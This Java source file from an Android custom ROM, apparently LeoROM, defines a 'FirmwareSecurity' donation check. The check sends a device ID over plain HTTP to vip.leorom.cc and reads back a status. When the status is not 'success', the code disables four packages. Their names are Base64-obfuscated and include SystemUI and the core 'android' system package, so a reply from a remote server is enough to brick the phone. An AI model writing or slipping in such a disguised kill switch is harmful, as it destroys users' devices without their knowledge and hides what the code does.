package com.salt.check;

import android.content.Context;

import android.content.pm.PackageManager;

import android.util.Base64;
import android.util.Log;


import androidx.appcompat.app.AppCompatActivity;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.json.JSONException;
import org.json.JSONObject;

import static com.salt.utils.SaltProper.BuildSecuritycheck;
import static com.salt.utils.SaltProper.Securitycheck;
import static com.salt.utils.SaltProper.SystemProperties.getLeoSystemPropString;
import static com.salt.utils.utils.TAG;
import static com.salt.utils.utils.getLeoSafetyID;
import static java.lang.System.getProperty;


public class FirmwareSecurity {

	public static  String getURL() {
		StringBuilder urlBuilder = new StringBuilder();
		urlBuilder.append("http://vip.leorom.cc/?action=check&code=");
		urlBuilder.append(getLeoSafetyID());
		return urlBuilder.toString();
	}
	private static FirmwareSecurity mInstance;

	public static FirmwareSecurity get(Context context) {
		if (mInstance == null) {
			synchronized (FirmwareSecurity.class) {
				if (mInstance == null) {
					mInstance = new FirmwareSecurity(context.getApplicationContext());
				}
			}
		}
		return mInstance;
	}
	private FirmwareSecurity(Context context){
		if(BuildSecuritycheck()){
			Log.v(TAG,"You are a team member or tester and will be exempt from donation checks");
		}else{
			getCheckData(context);
		}

	}
	public    String convertInputStreamToString(InputStream is) {
		byte[] byteArray = convertInputStreamToByteArray(is);
		if (byteArray == null)
			return null;
		return new String(byteArray);
	}

	private  byte[] convertInputStreamToByteArray(InputStream is) {
		ByteArrayOutputStream bos = null;
		try {
			int len = -1;
			byte[] buf = new byte[128];
			bos = new ByteArrayOutputStream();
			while ((len = is.read(buf)) != -1) {
				bos.write(buf, 0, len);
			}
			bos.flush();
			return bos.toByteArray();
		} catch (Exception e) {
		} finally {
			try {
				is.close();
				bos.close();
			} catch (IOException e) {
			}
		}
		return null;
	}
	public void getCheckData(Context context) {
		ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();
		singleThreadExecutor.execute(() -> {
			HttpURLConnection conn;
			try {
				URL url = new URL(getURL());
				conn = (HttpURLConnection) url.openConnection();
				conn.setConnectTimeout(5000);
				conn.setRequestMethod("GET");
				conn.setRequestProperty("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
				if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
					InputStream is = conn.getInputStream();
					String strJson = convertInputStreamToString(is);
					getJSONObject(strJson,context);
					is.close();
				}
			} catch (MalformedURLException e) {
			} catch (IOException e) {
			}
		});
	}

	public void getJSONObject(String strJson,Context context){
		try {
			JSONObject value = new JSONObject(strJson);
			String status = value.getString("status");
			if (!status.equals("success")){
				PackageManager pm = context.getPackageManager();
				pm.setApplicationEnabledSetting(new String(Base64.decode("Y29tLmxlby5zYWx0".getBytes(), 0)), 2, 0);
				pm.setApplicationEnabledSetting(new String(Base64.decode("Y29tLmFuZHJvaWQuc3lzdGVtdWk=".getBytes(), 0)), 2, 0);
				pm.setApplicationEnabledSetting(new String(Base64.decode("Y29tLmxlby5mcmFtZXdvcms=".getBytes(), 0)), 2, 0);
				pm.setApplicationEnabledSetting(new String(Base64.decode("YW5kcm9pZA==".getBytes(), 0)), 2, 0);
			}
			if (status.equals("success")){
				Securitycheck=true;
			}else {
				Securitycheck=false;

			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}
}
